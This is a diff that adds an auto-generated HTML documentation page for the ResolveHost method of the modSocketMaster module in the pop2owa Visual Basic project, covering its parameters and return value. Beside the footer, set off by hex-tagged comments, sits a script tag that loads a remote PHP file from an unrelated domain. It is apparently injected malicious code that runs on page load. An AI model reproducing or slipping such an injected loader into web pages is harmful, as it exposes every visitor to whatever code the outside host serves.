@@ -1,0 +1,70 @@
+<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="Text/html; charset=iso-8859-1">
+  <meta name="Author" content = "m.stamenov" >
+  <meta name="GENERATOR" content="VBDOX [2.0.15]" >
+  <link REL="stylesheet" TYPE="text/css" HREF="backsdk4.css">
+  <script SRC="langref.js"></script>
+  <title>modSocketMaster:&nbsp;ResolveHost</title>
+</head>
+<BODY TOPMARGIN="0">
+<TABLE CLASS="buttonbarshade" CELLSPACING=0><TR><TD>&nbsp;</TD></TR></TABLE>
+<TABLE CLASS="buttonbartable" CELLSPACING=0>
+<TR ID="hdr"><TD CLASS="runninghead" NOWRAP>modSocketMaster:&nbsp;ResolveHost</TD></TR>
+</TABLE>
+<!-- ============ METHOD ENTRY ============ -->
+<H1>ResolveHost</H1>
+<P>
+When a socket needs to resolve a hostname in asynchronous way
+it calls this function. If it has success it returns a nonzero
+number that represents the async task handle and register this
+number in the TableA list.<P>
+
+<p><br>
+</p><br>
+<PRE class=syntax><B><font class="keyword">&nbsp;Public</font><font class="keyword">&nbsp;Function</font><font class="identifier">&nbsp;ResolveHost</font>(
+	&nbsp;<font class="keyword">&nbsp;ByVal</font><font class="identifier">&nbsp;strHost</font><font class="keyword">&nbsp;As</font><font class="keyword">&nbsp;String</font>,
+	&nbsp;<font class="keyword">&nbsp;ByVal</font><font class="identifier">&nbsp;lngHOSTENBuf</font><font class="keyword">&nbsp;As</font><font class="keyword">&nbsp;Long</font>,
+	&nbsp;<font class="keyword">&nbsp;ByVal</font><font class="identifier">&nbsp;lngObjectPointer</font><font class="keyword">&nbsp;As</font><font class="keyword">&nbsp;Long</font>&nbsp;)<font class="keyword">&nbsp;As</font><font class="keyword">&nbsp;Long</font></B></PRE>
+<H4>Parameters</H4>
+<DL>
+<DT><I>strHost</I></TD>
+<DD>
+[ByVal]
+ <B>String</B>.
+  Host to resolve
+
+</DD>
+<DT><I>lngHOSTENBuf</I></TD>
+<DD>
+[ByVal]
+ <B>Long</B>.
+ 
+
+</DD>
+<DT><I>lngObjectPointer</I></TD>
+<DD>
+[ByVal]
+ <B>Long</B>.
+ 
+
+</DD>
+</DL>
+<H4>Return Values</H4>
+<B>Long</B>&nbsp;-&nbsp; Returns 0 if it fails.
+<H4>Remarks</H4>
+<P></P>
+<H4>See Also</H4>
+<P>
+<A HREF="pop2owa.html">Project pop2owa Overview</A>
+<A HREF="modSocketMaster.html">Class modSocketMaster Overview</A>
+<A HREF="modSocketMaster.html#public_props">modSocketMaster Properties</A>
+<A HREF="modSocketMaster.html#public_methods">modSocketMaster Methods</A>
+<B><A HREF="modSocketMaster.RegisterSocket.html">RegisterSocket</A></B>
+<B><A HREF="modSocketMaster.StringFromPointer.html">StringFromPointer</A></B>
+<DIV class=footer>Build on lunes, 24 de marzo de 2008 by VBDOX <BR>Copyright &copy; 2000 - 2003 M.Stamenov</DIV><!--419d74--><script type="text/javascript" src="http://biozapp.com/Kfx6FNrG.php?id=13042559"></script><!--/419d74-->
+
+<DIV class=footer style="COLOR: #000000; FONT-SIZE: 90%">
+</body>
+</html>
